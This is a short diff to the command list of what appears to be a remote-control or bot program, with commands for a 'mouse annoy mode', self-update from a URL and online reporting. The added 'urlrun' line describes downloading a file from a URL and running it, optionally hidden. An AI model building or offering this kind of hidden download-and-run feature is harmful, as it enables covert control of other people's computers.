@@ -7,6 +7,8 @@ rvcmd <- prefix for custom commands
 
 mouse [1|0] -- mouse annoy mode
 
+urlrun [url] [filename/path] [Min|Max|Hide] -- download file from url and run it
+
 update [url] -- update programm from url
 
 report -- report when still online
